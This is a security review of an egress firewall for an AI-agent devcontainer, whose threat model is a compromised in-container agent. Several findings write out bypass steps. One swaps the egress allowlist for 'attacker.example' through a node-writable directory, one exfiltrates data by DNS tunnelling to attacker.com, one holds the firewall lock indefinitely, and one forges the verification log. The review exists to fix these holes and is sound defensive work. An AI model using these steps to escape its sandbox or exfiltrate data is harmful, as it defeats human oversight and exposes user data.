# Security Review — egress hardening fix wave d53bf6a..2839e59

Commit: 2839e59

**Scope:** `git diff d53bf6a..2839e59 -- devcontainer-config/` — `init-firewall.sh`, `cc-sni-proxy.py`, `cc-isolated.sh`, `install.sh`, `Dockerfile`, `devcontainer.json`, `egress/base.txt`. Re-review pass over the two fix commits (b708266, 2839e59) answering the 2026-09-03 rubric and the loop-pass fact-check. `test/*.bats` and `docs/*` in the range are committed context, read only to avoid false "missing" claims. Threat model: a compromised in-container agent (uid `node`, NOPASSWD sudo for exactly `/usr/local/bin/init-firewall.sh`) trying to exfiltrate or reach an attacker host.
**Date:** 2026-09-03
**Based on:** docs/reviews/code-fact-check-report.md (k=1 loop pass) and security-review-2026-09-03-egress-hardening.md

No HALT-class pattern was detected in the diff: no plaintext credential added, no TLS verification disabled, no unauthenticated privileged endpoint, no new user-facing SQL/command-injection sink.

Two things are worth stating before the tables. First, the fixes largely do what they claim: the registry hole is closed, port canonicalisation is closed (executed below), the PATH/shebang hijack is closed, and IPv6 is closed on any kernel with a v6 filter table. Second, this pass found a **pre-existing image-permission defect that the prior review's S2 row got wrong** — `/usr/local/share` is `node:node`, so the agent can replace the whole `cc-egress` directory and then trigger its own firewall rebuild. That defect outranks everything the fix wave addressed, and it is the reason no safe-to-merge conclusion is offered.

---

## Prior findings status

| Prior # | Finding | Status | Evidence (path:line) |
|---|---|---|---|
| 1 | IPv6 egress entirely unenforced; new DNS/SNI controls IPv4-only | **partially** — closed where a v6 filter table exists; the `else` branch warns and continues, and nothing gates completion on it (N6) | `init-firewall.sh:537-550`, `:1027` |
| 2 | No mutual exclusion; concurrent runs can drop the DNS guards | **partially** — the flock closes the interleaving (`:303-308`), but the recommendation's second half (`-w` on main-path `iptables`/`ipset`) was not applied, and the lock itself is agent-DoS-able (N4, N5) | `init-firewall.sh:303-308`, `:515-521` |
| 3 | Root helper resolution goes through PATH | **closed** — shebang pinned and PATH exported before the first helper call; residual is that `CC_FIREWALL_PATH` is now itself an escape hatch if sudo ever stops resetting the environment | `init-firewall.sh:32-38`; `cc-sni-proxy.py:1` |
| 4 | `cc-sni-proxy.py` outside the bless manifest | **closed** — added to `PAYLOAD` and `enforcement_files()`, together with `link-claude-home.sh`; `claude-home/` remains outside and is now documented as such | `install.sh:25`; `cc-isolated.sh:46-61` |
| 5 | Negative SNI probe passes on any curl failure | **partially** — a logged refusal is now required, but the log line is forgeable by `node` over loopback and the rule-presence assertion was not added (N3) | `init-firewall.sh:1010-1022` |
| 6 | SNI filtering bypassable via ECH or multi-entry ServerNameList | **open** — `parse_sni` and `Allowlist.allows` unchanged in this range | `cc-sni-proxy.py:85-99`, `:144-146` |
| 7 | `OPENROUTER_API_KEY` present in every session, exfiltrable through base egress | **open** — unchanged; logged in `docs/working/questions.md`, and the "inert" sentence still stands | `devcontainer.json:138-148` |
| 8 | Proxy log world-readable and unbounded | **open, and now load-bearing** — the same 0644 log is the evidence the completion gate reads (N3); unchanged otherwise | `cc-sni-proxy.py:247`; `init-firewall.sh:925-926`, `:1018` |
| 9 | Proxy is an unbounded single choke point for all agent 443 egress | **open** — deliberately deferred (questions.md, A5–A8) | `cc-sni-proxy.py:199-209` |
| 10 | Port normalisation disagreement blackholes a zero-padded entry | **closed** — verified by execution below | `init-firewall.sh:135-146` |
| 11 | GitHub CIDRs admitted on tcp/22 with no name layer | **open** — the `.githubassets.com` half of the pair is resolved (dropped from the SNI list); the tcp/22 grant is unchanged | `init-firewall.sh:936-942`; `:736-746` |

No prior finding **regressed**; one fail-safe was inverted by a fix (N2), which is a regression of behaviour rather than of a filed finding.

---

## Trust Boundary Map

```
B1: host shell env (GH_TOKEN, OPENROUTER_API_KEY)
      → devcontainer.json "containerEnv" ${localEnv:*}
      → every process env inside the container, incl. `node`               (unchanged)

B2: host-side config dir → cc-isolated.sh check_manifest() → image build
      → /usr/local/bin, /usr/local/share/cc-egress
      ✓ cc-sni-proxy.py and link-claude-home.sh now inside the envelope    (moved: hole closed)
      ✗ claude-home/ still installed-but-unhashed                          (moved: now documented)

B3: agent (uid node) → `sudo /usr/local/bin/init-firewall.sh` (NOPASSWD)
      → root execution, helpers resolved through a SCRIPT-PINNED PATH      (moved: PATH pin)

B3a: agent (uid node) → write access to /usr/local/share (node:node)
      → rename/replace /usr/local/share/cc-egress/*.txt
      → next `sudo init-firewall.sh` composes the agent's own allowlist    (new to this review, pre-existing in the image)

B4: agent network syscalls → nat/filter OUTPUT → outside world
      → IPv4 as before; IPv6 now DROP-by-default when a v6 filter table
        exists, unfiltered-with-a-warning when it does not                 (moved)

B5: attacker-influenced ClientHello on 127.0.0.1:3443 → parse_sni →
      Allowlist.allows → getaddrinfo → open_connection                     (unchanged)

B6: /run/cc-firewall.lock (root-created 0644, in world-readable /run)
      → any local uid may open it O_RDONLY and hold LOCK_EX
      → every later firewall run waits CC_FIREWALL_LOCK_WAIT, then exits 1 (new)

B7: /run/cc-sni-proxy/proxy.log (root-owned 0644, dir 0755)
      → grep by the completion gate at :1018
      → any local uid can cause an arbitrary `REJECT sni=<name> ` line by
        connecting to 127.0.0.1:3443 with that SNI                         (new: log became a control input)
```

| S | Source | Mutability class | Trust per sink class |
|---|--------|------------------|----------------------|
| S1 | `/etc/resolv.conf` | Docker-runtime-mutable, root-owned; not asserted by this repo | Unchanged from R1: untrusted toward `iptables -d` and `server=/…/<ns>`, constrained only by octet validation. |
| S2 | `/usr/local/share/cc-egress/*.txt` | **Correction to R1.** Files are root-owned 0444, but the *parent directory* `/usr/local/share` is `node:node` (`Dockerfile:60-61`) and carries no sticky bit, so `node` can unlink/rename the whole `cc-egress` subtree and substitute its own | **Untrusted for content as well as grammar** toward `ipset add`, `dig`, `server=` and the SNI allowlist. R1's "agent cannot rewrite" is wrong. |
| S3 | `api.github.com/meta` JSON | Remote | Unchanged: shape- and regex-validated before `ipset add`. |
| S4 | DNS A records | Remote, cache-lifetime | Unchanged. |
| S5 | SNI in a ClientHello at 127.0.0.1:3443 | Fully attacker-controlled per connection; `-o lo` at `:795` admits `node` directly | Untrusted toward `getaddrinfo`/`open_connection` **and now toward the completion gate**, because the reject it produces is written to the log the gate greps. |
| S6 | `/run/cc-sni-proxy/*`, `/run/cc-dnsmasq.pid` | Root-written, node-readable | Unchanged for kill-by-pid; changed for the log (S5). |
| S7 | `CC_*` env vars, now including `CC_FIREWALL_PATH` and `CC_FIREWALL_LOCK` | Caller-controlled | Neutralised by sudo `env_reset` + the absence of `SETENV` on the sudoers rule (`Dockerfile:418`) — still asserted in comments, not in config, but the blast radius grew: `CC_FIREWALL_PATH` is now a direct root-code-execution primitive if that ever changes. |
| S8 | `/run/cc-firewall.lock` | Root-created 0644 in a 0755 root dir; any uid may open O_RDONLY | Untrusted toward availability of the whole enforcement path (B6). |
| S9 | The bless manifest | Host-side, human-blessed | Now covers the proxy and the link script; `claude-home/` still outside. |

The fix wave moves three boundaries in the right direction (B2's hole closed, B3's PATH pinned, B4's IPv6 half closed) and introduces two new agent-reachable inputs to the *enforcement control plane itself*: the lock file (B6) and the proxy log (B7). Both are availability-or-verification surfaces rather than egress surfaces, so the direction stays fail-closed — but each converts a previously unconditional guarantee into one the agent can influence. The dominant residual risk is not in the diff at all: B3a lets a compromised agent author the allowlist that every one of these mechanisms then faithfully enforces.

---

## Findings

#### `/usr/local/share` is node-owned, so the agent can replace the egress profile directory and then make the firewall install its own allowlist

**Severity:** Critical
**Location:** `devcontainer-config/Dockerfile:59-61`, `:383-384`, `:405-419`; consumed at `devcontainer-config/init-firewall.sh:40`, `:50-60`
**Boundary:** B3a, B2, S2
**Move:** 1 (trust boundaries), 5 (invert the access-control model), 12 (sweep call sites)
**Confidence:** Medium (ownership and the absence of a corrective `chown` are read-static and unambiguous; not executed against a built image)
**Evidence:**
> `# Ensure default node user has access to /usr/local/share`
> `RUN mkdir -p /usr/local/share/npm-global && \`
> `  chown -R node:node /usr/local/share`

and the only later permission pass over the profile directory, which sets modes but never ownership:
> `  chmod 0555 /usr/local/share/cc-egress && \`
> `  chmod 0444 /usr/local/share/cc-egress/*.txt && \`
> `  printf '%s\n' "${CC_EGRESS_PROFILE}" > /etc/cc-egress-profile && \`
> `  chmod 0444 /etc/cc-egress-profile && \`
> `  echo "node ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh" > /etc/sudoers.d/node-firewall && \`
> `  chmod 0440 /etc/sudoers.d/node-firewall`
> (… remainder of the `RUN` not shown: it ends there; the next instruction is `USER node`.)

against the comment three lines above it, which states the property this finding contradicts:
> `# /etc/cc-egress-profile is root-owned and world-read-only. `node` has NOPASSWD sudo`
> `# for init-firewall.sh and nothing else, so it can neither rewrite this file nor pass`
> `# a wider profile through sudo (env_reset strips the environment). Widening a`
> `# project's egress therefore requires a host-side re-register + re-bless + rebuild —`
> `# i.e. a human. This is what keeps H5 (per-project egress) from becoming a`
> `# self-service escape hatch for the agent.`

**Legibility-target:** for-author
`chown -R node:node /usr/local/share` runs at image line 61, long before `COPY egress/ /usr/local/share/cc-egress/` at :383; `COPY` creates the child directory root-owned but does not alter the pre-existing parent, and the final `RUN` at :405 fixes modes only. Write permission on a non-sticky directory is what authorises `rename(2)` and `unlink(2)` of its entries regardless of their own ownership, so `node` can `mv /usr/local/share/cc-egress /tmp/x; mkdir /usr/local/share/cc-egress; echo 'attacker.example' > /usr/local/share/cc-egress/base.txt` and then `sudo /usr/local/bin/init-firewall.sh` — the one command it is explicitly permitted to run. The script's `EGRESS_DIR` default is exactly that path (`:40`), so every control in this range then enforces the agent's own allowlist: `attacker.example` gets an ipset member, a `server=/attacker.example/<ns>` resolver line, and an SNI allowlist entry. The PATH pin, the flock, the IPv6 default-deny and the SNI proxy all continue to work perfectly and are all irrelevant. Failure mode: **the policy input to a privileged, agent-invokable enforcement job is agent-writable**.

**Recommendation:** Add `chown -R root:root /usr/local/share` (or at minimum `chown root:root /usr/local/share /usr/local/share/cc-egress`) to the final root `RUN` in `Dockerfile`, keeping `/usr/local/share/npm-global` node-owned as the only exception, and verify on the built image with `ls -ld /usr/local/share /usr/local/share/cc-egress`. Independently, have `init-firewall.sh` refuse to run when `EGRESS_DIR` or any file in it is not root-owned (`stat -c %u`), so the assumption is checked at use rather than only at build. Correct the `:402-407` comment once both hold.

---

#### A single-label profile entry now becomes a whole-TLD forwarding zone in the resolver, re-opening recursive-forward DNS tunnelling

**Severity:** Medium
**Location:** `devcontainer-config/init-firewall.sh:209-217` (the widened regex), reached from `:127-146` (`parse_entry` admits single labels)
**Boundary:** B7 (resolver config), B3a
**Move:** 2 (implicit sanitization assumption), 5 (invert the access-control model), 11 (enumerate bypasses)
**Confidence:** High (executed)
**Evidence:**
> `    # Same label grammar as parse_entry (a single label is allowed there, so it must`
> `    # be allowed here too — otherwise an entry can be ipset-admitted yet unresolvable).`
> `    if [[ ! "$d" =~ ^[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?)*$ ]]; then`
> `      echo "WARNING: not a hostname, omitting from resolver allowlist (stays unresolvable): $d" >&2`
> `      continue`
> `    fi`
> `    while read -r ns; do`
> `      [ -n "$ns" ] || continue`
> `      echo "server=/$d/$ns"`
> `    done < <(printf '%s\n' "$resolvers")`
> (… remainder of `compose_dnsmasq_conf` not shown: the loop closes and the function ends.)

Executed, with an egress dir containing `com`, `example.org:0443`, `localhost`:
> `com	443`
> `example.org	443`
> `localhost	443`
> …
> `server=/com/10.0.0.53`
> `server=/example.org/10.0.0.53`
> `server=/localhost/10.0.0.53`

**Legibility-target:** for-author
The trailing `+` became `*`, so a bare label passes. `server=/<domain>/<ns>` in dnsmasq matches the domain **and every name beneath it**, which is exactly why the block's own header calls it the mechanism that closes recursive-forward tunnelling. A single-label entry therefore hands the entire TLD to the upstream resolver: with `com` in any profile, `dig <32-bytes-of-exfiltrated-data>.attacker.com` is forwarded and answered, and the address layer never sees it because DNS tunnelling needs no TCP reachability. Before this change the `+` regex omitted such an entry with a WARNING — R1 recorded single labels as "dead, not permissive"; the fix inverted that fail-safe while solving a narrower problem (`localhost:11434` for Ollama). The new bats case at `test/init-firewall-rules.bats` pins `server=/localhost/…` as desired behaviour, so this will not regress on its own. Reachability today is an author typo; combined with F1 above it is directly agent-reachable. Failure mode: **a grammar relaxed for one benign case that also admits a suffix wildcard over a public namespace**.

**Recommendation:** Keep the grammars aligned by tightening `parse_entry` rather than loosening the resolver: require at least two labels for any entry that gets a `server=` line, and handle the single-label case explicitly and narrowly (an `address=/localhost/127.0.0.1` special case, or require `localhost.` style entries to be listed with an explicit host suffix). If single labels must stay, reject the IANA public-suffix shapes at minimum and add a bats case pinning `com` to a WARNING and no `server=` line.

---

#### The negative-probe log check reads a sink any local uid can write into, and still does not assert the redirect rule

**Severity:** Medium
**Location:** `devcontainer-config/init-firewall.sh:1010-1022`, `:795`, `:956-960`; `devcontainer-config/cc-sni-proxy.py:182-183`, `:247`
**Boundary:** B7, B4, B5
**Move:** 3 (check the error path), 4 (TOCTOU), 11 (enumerate bypasses)
**Confidence:** Medium
**Evidence:**
> `# A failed curl alone is not proof: a missing redirect, a dead proxy, or a broken`
> `# runuser all fail the same way. The proxy must have SEEN and REFUSED the name.`
> `if ! grep -q "REJECT sni=not-allowlisted.invalid " "$SNI_LOG" 2>/dev/null; then`
> `    echo "ERROR: Firewall verification failed - the SNI proxy did not log a refusal for not-allowlisted.invalid (is the 443 redirect in place? see $SNI_LOG)"`
> `    exit 1`
> `fi`
> `echo "Firewall verification passed - non-allowlisted SNI refused by the proxy (logged)"`

against the line that produces the evidence, which records no provenance the grep uses:
> `        if not allow.allows(sni):`
> `            log(f"REJECT sni={sni} orig_dst={orig}: not in allowlist")`
> `            return`

**Legibility-target:** for-author
The check is a real improvement over "curl exited non-zero" and closes the *accidental* failure modes the comment names. It does not close the deliberate one. `iptables -A OUTPUT -o lo -j ACCEPT` at `:795` admits `node` to 127.0.0.1:3443 directly, and a connection there carries dport 3443, so the `CC_SNI` nat jump (dport 443) never applies — the proxy handles it anyway and writes the exact line the gate greps. A `node` process looping TLS handshakes with SNI `not-allowlisted.invalid` at 127.0.0.1:3443 therefore satisfies the gate continuously, whatever state the redirect is in, which restores precisely the R1-F5 property ("verification that cannot distinguish the control from its absence") in the one scenario where an attacker is present. The `orig_dst=` field already carries the discriminator the grep discards: a genuinely redirected probe logs `orig_dst=$ANTHROPIC_PROBE_IP:443`, a loopback forgery logs `orig_dst=127.0.0.1:3443`. The prior recommendation's second half — asserting `iptables -t nat -C OUTPUT -p tcp --dport 443 -j CC_SNI` — was not implemented. Failure mode: **a completion gate whose evidence channel is writable by the party it is meant to constrain**.

**Recommendation:** Grep for `REJECT sni=not-allowlisted.invalid orig_dst=$ANTHROPIC_PROBE_IP:443 ` so a loopback-originated line cannot satisfy it, and add the rule-presence assertion (`iptables -t nat -C OUTPUT -p tcp --dport 443 -j CC_SNI` and the matching `CC_SNI_GUARD` check) before `FIREWALL_COMPLETE=1`. Separately, make the log 0640 root:ccproxy (R1-F8) so the file is not agent-readable either.

---

#### `node` can hold the firewall lock indefinitely and veto every subsequent firewall run

**Severity:** Medium
**Location:** `devcontainer-config/init-firewall.sh:295-308`
**Boundary:** B6, B3
**Move:** 4 (TOCTOU / shared-namespace resource), 5 (invert the access-control model), 11 (enumerate bypasses)
**Confidence:** High (flock semantics executed; `/run` mode read-static)
**Evidence:**
> `# Serialise on a root-owned lock so a second invocation waits`
> `# for the first to finish (or fails closed via the trap if it cannot get the lock).`
> `# The lock is taken AFTER the trap is installed so a lock failure also ends at DROP.`
> `FIREWALL_LOCK="${CC_FIREWALL_LOCK:-/run/cc-firewall.lock}"`
> `exec 9>"$FIREWALL_LOCK"`
> `if ! flock -w "${CC_FIREWALL_LOCK_WAIT:-120}" 9; then`
> `    echo "ERROR: another init-firewall.sh run is still holding $FIREWALL_LOCK" >&2`
> `    exit 1`
> `fi`
> (… remainder of the block not shown: the next statement is `ALLOWED_DOMAINS="$(compose_domains)"`.)

Executed in this sandbox: a process holding `LOCK_EX` on an **O_RDONLY** descriptor of a 0644 file blocks a later `exec 9>file; flock -w 5 9`, which times out.

**Legibility-target:** for-author
`exec 9>` creates the file with the root process's umask, i.e. 0644, inside `/run` (0755 root-owned), so `node` cannot create or replace it — but it does not need to. `flock(2)` places an advisory lock on any open descriptor and requires no write permission, and `flock(1)` opens with `O_CREAT|O_RDONLY`, so `flock /run/cc-firewall.lock -c 'sleep infinity'` as `node` takes the exclusive lock the moment the first run releases it. Every later run — the `postStartCommand` re-assert, and `cc-isolated.sh:425`'s re-assert after a failed `probe_boundary` — then blocks 120 s and exits 1 into the trap. The direction is safe (the trap forces DROP; on a container with an intact ruleset the accept rules are untouched, so the previous ruleset persists), so this is not an egress bypass. What it *is* is a way for a compromised agent to make the boundary un-reassertable: the launcher's "probe failed → re-assert → re-probe" recovery path is exactly the guardrail this disables, and it reports as a 120-second hang plus a fail-closed error rather than as an attack. Failure mode: **a serialisation primitive placed in a namespace the constrained party can also lock**.

**Recommendation:** Move the lock into a root-only directory — `install -d -m 0700 -o root -g root /run/cc-firewall` at the top of the script, lock `/run/cc-firewall/lock` — so a non-root uid cannot open it at all. Keep the wait, and make the timeout message distinguish "another run" from "lock held by a non-firewall process" by logging `fuser`/`lsof` output or the holder's uid when acquisition fails.

---

#### IPv6 default-deny is best-effort and its absence does not gate completion, so the R1-F1 bypass survives intact on kernels without a v6 filter table

**Severity:** Medium
**Location:** `devcontainer-config/init-firewall.sh:523-550`, `:1027`
**Boundary:** B4
**Move:** 3 (check the error path), 5 (invert the access-control model), 11 (enumerate bypasses)
**Confidence:** Medium
**Evidence:**
> `if command -v ip6tables >/dev/null 2>&1 && ip6tables -w 5 -S OUTPUT >/dev/null 2>&1; then`
> `    ip6tables -P INPUT DROP`
> `    ip6tables -P FORWARD DROP`
> `    ip6tables -P OUTPUT DROP`
> `    ip6tables -F`
> `    ip6tables -X`
> `    ip6tables -A INPUT -i lo -j ACCEPT`
> `    ip6tables -A OUTPUT -o lo -j ACCEPT`
> `    ip6tables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT`
> `    ip6tables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT`
> `    echo "IPv6: default-deny installed (loopback and established flows only)"`
> `else`
> `    echo "WARNING: no usable ip6tables filter table — IPv6 egress is NOT filtered in this container" >&2`
> `fi`
> (… remainder not shown: the next statement is the `# 2. Selectively restore ONLY internal Docker DNS resolution` block.)

**Legibility-target:** for-author
The guard is the right shape for the failure the fact-check escalated (E2): a kernel with the binary but no v6 filter table no longer aborts the run. But the two conditions it conflates are not equivalent. "No IPv6 filter table" is inferred from a *warning on stderr* and then treated as "there is nothing IPv6 to filter", while the container may still have a routable IPv6 address whose reachability nothing here tests. In that state `FIREWALL_COMPLETE=1` is still set at `:1027`, the launcher's `probe_boundary` still passes, and every claim the file now makes about IPv6 (`:575-577`, `:622-627`, `:715-722`) is false for that container — R1-F1 in full, with the difference that the file now asserts it is closed. A cheap discriminator exists: `ip -6 addr show scope global` distinguishes "IPv6 is unusable, nothing to do" from "IPv6 is routable and unfiltered", and only the latter should be fatal. Two smaller notes in the same block: the `-P/-F/-A` calls carry no `-w` (unlike the probe immediately above and the trap's copies), and `-m state` is assumed available for the v6 family — either failing aborts the run into the trap, which is the safe direction but a hard bootstrap outage. Failure mode: **a control whose non-installation is a warning rather than a gate, under documentation that says it is installed**.

**Recommendation:** In the `else` branch, check `ip -6 addr show scope global` (or `ip -6 route show default`): if a global IPv6 address or default route exists, treat the missing filter table as fatal (`exit 1` → trap → DROP) rather than a warning; if not, keep the warning. Add `-w 5` to the `ip6tables` mutation calls for consistency with the probe and the trap, and reword `:575-577` / `:622-627` / `:715-722` to say "default-denied where an IPv6 filter table exists" so the file does not over-claim.

---

#### Main-path `iptables`/`ipset` calls still take no `-w`, so an external xtables-lock holder aborts a rebuild mid-flight

**Severity:** Low
**Location:** `devcontainer-config/init-firewall.sh:511-521`, `:537-546`, `:795-1005`
**Boundary:** B4, B3
**Move:** 3 (check the error path)
**Confidence:** High
**Evidence:**
> `iptables -F`
> `iptables -X`
> (… remainder of the flush block not shown: the `-t nat` and `-t mangle` `-F`/`-X` pairs and `ipset destroy allowed-domains 2>/dev/null || true`, then the IPv6 block.)

**Legibility-target:** for-orchestrator-synthesis
The flock removes the failure mode that mattered — two copies of *this script* interleaving — so the residual is narrower than R1-F2: any other process contending for the xtables lock (a `docker network` operation on the host namespace, a future in-container tool with NET_ADMIN) makes a bare `iptables -A` fail instantly, `set -e` fires, and the trap forces DROP. That is fail-closed and self-announcing, hence Low; it is recorded only because the R1 recommendation had two halves and the second was not applied, and because the trap's own calls already demonstrate the pattern (`-w 5`).

**Recommendation:** Add `-w 5` to the main-path `iptables`/`ip6tables` calls (a small wrapper function is cheaper than editing ~40 call sites and shellcheck-clean), so a contended lock waits instead of aborting a healthy rebuild.

---

### Untested bypass candidates

**Firewall flock (`:303-308`)** — (1) `node` holds `LOCK_EX` on an O_RDONLY fd of the 0644 lock file → **Tested** (flock-on-read-only-fd blocking executed in-sandbox); mode/ownership of `/run` read-static. F4. (2) `node` pre-creates the lock file before the first root run → **Tested (traced)**: `/run` is 0755 root-owned in the Docker default rootfs; `node` cannot create an entry there. (3) `node` passes `CC_FIREWALL_LOCK=/tmp/mine` through sudo to relocate the lock and defeat serialisation → **Tested (traced)**: the sudoers rule (`Dockerfile:418`) carries no `SETENV` tag and Debian's `Defaults env_reset` applies, so `sudo VAR=… cmd` is refused; **Listed** for the environment default itself, which the repo still asserts only in comments. (4) A daemon inheriting fd 9 and holding the lock forever → **Tested (traced)** for the proxy (`cc-sni-proxy.py:267-275` closes fds) and mitigated for dnsmasq by `9>&-` at `:740`/`:949`; **Listed** for any *other* long-lived child a future edit adds without `9>&-`. (5) `SIGKILL` of the holding script leaving a stale lock → **Tested (traced)**: flock is released on fd close at process death, so no stale lock persists.

**PATH pin (`:38`)** — (1) `node` sets `CC_FIREWALL_PATH` through sudo → **Tested (traced)**, same `env_reset`/no-`SETENV` argument as above; the escape hatch is real but unreachable under the shipped sudoers. (2) shebang interpreter hijack via `/usr/local/share/npm-global/bin/python3` → **Tested (traced)**: `#!/usr/bin/python3` is absolute, and the script's own PATH no longer contains the npm dir. (3) A helper reached *before* line 38 → **Tested (traced)**: lines 1-37 are comments, `set`, and `IFS`; no command runs before the export, including on the `--print-*` paths. (4) Replacing a binary *inside* a pinned directory → **Listed**: `/usr/local/bin` and `/usr/local/sbin` are root-owned in the base image, but this was not verified on a built image and is the same class of check F1 recommends. (5) `LD_PRELOAD`/`PYTHONPATH` rather than PATH → **Listed**: also stripped by `env_reset`, unasserted in the repo.

**IPv6 default-deny (`:537-550`)** — (1) A kernel with no v6 filter table on a host with routable IPv6 → **Listed**, F6; the run completes and reports success. (2) A conntrack entry established over IPv6 *before* the firewall ran, matched by the new `ESTABLISHED,RELATED` accept → **Listed**, requires a live dual-stack container; same shape as the pre-existing IPv4 candidate in R1. (3) `-m state` unavailable for the v6 family → **Tested (traced)**: `set -e` aborts into the trap; fail-closed but a bootstrap outage. (4) IPv6 NAT/mangle tables left unflushed (only `filter` is touched) → **Listed**: with OUTPUT policy DROP a nat rule cannot create egress on its own, but a pre-existing `ip6tables -t nat` REDIRECT to a loopback listener would still be reachable via the `-o lo` accept. (5) `ip6tables-nft` vs `ip6tables-legacy` writing different tables from the ones the probe read → **Listed**, not executed.

**Negative-probe log check (`:1018`)** — (1) `node` connects to 127.0.0.1:3443 with SNI `not-allowlisted.invalid` to forge the line → **Tested (traced)**: `-o lo` accept at `:795`, dport 3443 escapes the `CC_SNI` jump, `cc-sni-proxy.py:183` writes the exact matched substring. F3. (2) A stale line from a previous run satisfying the grep → **Tested (traced)**: `os.open(..., O_TRUNC)` at `cc-sni-proxy.py:247` truncates the log at every proxy start, which happens earlier in the same run. (3) `node` writes the line into the log file directly → **Tested (traced)**: log is root-owned 0644 in a 0755 root directory; no write path for `node`. (4) The probe passing while the `CC_SNI_GUARD` filter chain is absent → **Listed**: neither chain's presence is asserted before `FIREWALL_COMPLETE=1`. (5) A proxy that logs the REJECT and then dies before the next connection → **Listed**, the R1 liveness gap (fact-check Claim 13) is unchanged.

**Canonical-port grammar (`:135-146`, `:936-942`, `:209-217`)** — (1) zero-padded port `0443` reaching `ipset add` or missing the `,443,` filter → **Tested**: executed `--print-entries` emits `443`; the bats case pins `tcp:443` and the allowlist line. (2) Single-label entry becoming a TLD forwarding zone → **Tested**: executed, F2. (3) Injection into `ipset add` / `server=` / the SNI allowlist through the domain half → **Tested (traced)**: the `^label(\.label)*$` regex admits only `[A-Za-z0-9-]` and `.`; `$((10#$port))` guarantees the port half is a decimal integer, which is strictly narrower than the string it replaced. (4) A port list long enough to overflow a rule or an ipset member → **Tested (traced)**: `^[0-9]{1,5}(,[0-9]{1,5})*$` is unbounded in length, but each element is validated 1-65535 and each becomes its own `ipset add`; no single argument grows. (5) `GITHUB_DNS_ZONES` word-splitting under `IFS=$'\n\t'` in the new SNI loop → **Tested (traced)**: `tr ' ' '\n'` converts the separators before the unquoted expansion, so the split is on newline as intended.

---

## Endorsement Claims

- **Claim:** `parse_entry` emits a decimal-canonical port, so `0443` reaches every downstream consumer as `443`.
  **Location:** `devcontainer-config/init-firewall.sh:135-146`
  **Evidence:** executed
  **Verified:** Running `CC_EGRESS_DIR=<tmp> bash init-firewall.sh --print-entries` over an egress file containing `example.org:0443` printed `example.org<TAB>443`; the bats case added in b708266 additionally pins `ipset add -exist allowed-domains 203.0.113.7,tcp:443` and the SNI allowlist line.
  **Not verified:** The corresponding live `ipset` member on a kernel (no ipset in this sandbox).
  **route: code-fact-check**

- **Claim:** With `com` in a profile file, `compose_dnsmasq_conf` emits `server=/com/<ns>`.
  **Location:** `devcontainer-config/init-firewall.sh:209-217`
  **Evidence:** executed
  **Verified:** `--print-dnsmasq-conf` over an egress file containing `com` printed `server=/com/10.0.0.53` alongside the two GitHub zones; the pre-fix `+`-anchored regex would have emitted the WARNING branch instead.
  **Not verified:** dnsmasq's runtime treatment of a single-label `server=` domain (no dnsmasq binary here); the fact-check records the same gap for `localhost`.
  **route: code-fact-check**

- **Claim:** An advisory `LOCK_EX` taken on a read-only descriptor blocks a later writer's `flock -w`, so read access to the lock file is sufficient to withhold it.
  **Location:** `devcontainer-config/init-firewall.sh:303-308`
  **Evidence:** executed
  **Verified:** A holder process opening a 0644 file `O_RDONLY` and taking `LOCK_EX` caused `( exec 9>file; flock -w 5 9 )` to time out and return non-zero.
  **Not verified:** That `/run` is 0755 root-owned and the lock file 0644 inside the built image — read-static from Docker defaults and the root umask, not observed.

- **Claim:** `cc-sni-proxy.py` and `link-claude-home.sh` are now inside the bless envelope, and the only `PAYLOAD` item still outside it is `claude-home/`.
  **Location:** `devcontainer-config/install.sh:25`; `devcontainer-config/cc-isolated.sh:46-61`
  **Evidence:** read-static
  **Verified:** `PAYLOAD` lists both files, `enforcement_files()` echoes both between `init-firewall.sh` and `cc-isolated.sh`, and a set difference of the two lists leaves only `claude-home` (`egress` is covered by the sorted `egress/*.txt` glob).
  **Not verified:** That `compute_manifest`/`check_manifest` behave as intended over the new entries on a real config dir; the bats case in `test/cc-isolated-functions.bats` exercises the listing, not a bless/verify round trip on the shipped tree.
  **route: code-fact-check**

- **Claim:** The proxy's shebang is absolute, so the interpreter is not PATH-resolved.
  **Location:** `devcontainer-config/cc-sni-proxy.py:1`
  **Evidence:** read-static
  **Verified:** The first line is `#!/usr/bin/python3`; no `env` indirection remains, and `init-firewall.sh:38` exports a PATH containing no node-writable directory before any helper runs.
  **Not verified:** That `/usr/bin/python3` exists and is root-owned in the built `node:22`-derived image (asserted by the base image, not by this repo).

Guardrails deliberately **not** listed here because they carry untested bypass candidates: the firewall flock (F4), the IPv6 default-deny block (F6), the negative-probe log check (F3), the `CC_SNI`/`CC_DNS` redirects and their guard chains (unchanged, R1-F1/F2/F5), `Allowlist.allows`/`parse_sni` (R1-F6), and the egress-profile directory as a trusted policy source (F1).

---

## Primitive sweep

### Advisory file lock as a mutual-exclusion primitive

| Call site | Source (S-label) | Guard | Disposition |
|---|---|---|---|
| `init-firewall.sh:304-308` `exec 9>…; flock -w` | S8 | Path is root-only-writable (`/run` 0755); taken after the EXIT trap; `9>&-` on both daemon starts | Serialisation holds against a second copy of the script. The lock file is world-**readable**, and readability is sufficient to hold the lock — F4. |

### Environment-controlled resolution of privileged helpers

| Call site | Source (S-label) | Guard | Disposition |
|---|---|---|---|
| `init-firewall.sh:38` `export PATH="${CC_FIREWALL_PATH:-…}"` | S7 | sudo `env_reset`, no `SETENV` on the sudoers rule (`Dockerfile:418`) | Closes R1-F3 for every root-run helper. Creates a single high-value env var whose only defence remains an unasserted distro default. |
| `init-firewall.sh:945-950` `"$SNI_PROXY_BIN" --daemon … 9>&-` | S7 (path), file's own absolute shebang | `-x` check; root:root 0555 (`Dockerfile:405-406`) | Interpreter no longer PATH-resolved; fd 9 no longer inherited. |
| `init-firewall.sh:740` `dnsmasq … 9>&-` | S7 (config path), S1/S2 (content) | `command -v` check; config root-owned 0644 | fd 9 explicitly closed; dnsmasq's own fd hygiene is not relied on. |

### Policy input read by a privileged, agent-invokable job

| Call site | Source (S-label) | Guard | Disposition |
|---|---|---|---|
| `init-firewall.sh:40`, `:50-60` `EGRESS_DIR` composition | S2 | `parse_entry` grammar; files 0444 root-owned | **Grammar is validated; provenance is not.** The parent directory is node-owned, so the content is agent-authorable — F1. |
